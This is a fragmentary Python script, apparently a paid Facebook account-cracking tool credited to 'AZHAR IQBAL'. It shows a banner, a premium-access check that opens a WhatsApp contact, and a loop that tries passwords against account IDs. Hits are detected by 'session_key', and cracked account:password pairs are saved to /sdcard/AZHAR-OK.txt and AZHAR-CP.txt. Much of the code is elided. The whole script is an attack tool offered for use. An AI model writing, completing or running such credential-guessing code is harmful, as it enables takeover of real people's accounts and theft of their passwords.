...
def premium():
    ...
    try:
        ...
        if id in httpCaht:
            ...
            os.system('xdg-open https://wa.me/+923492627242')
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()
...
{uu}  .##..##..######..##..##..##..##..##..##.
\033[1;93m=================================
\033[1;97m Owner  : AZHAR IQBAL 
\033[1;97m GitHub : AZHAR-245 
\033[1;97m Version:\033[1;92m 0.8 \033[1;97m:
\033[1;97m Status : PAID :
\033[1;97m Notice : Use 100090/100091 For More OK Ids :/
\033[1;93m=================================
'''
...
def method():
    ...
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("тЬУ")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('тАв')}/sdcard/AZHAR-OK.txt")
    print('\033[1;93m='*25)
    print()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mAZHAR-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92mтАв\033[1;97m '+pword+'  ')
                open('/sdcard/AZHAR-OK.txt','a').write(f'{acc} тАв {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mAZHAR-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91mтАв\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/AZHAR-CP.txt','a').write(f'{acc} тАв {pword}\n')
                break
            else:
                continue
        loop += 1
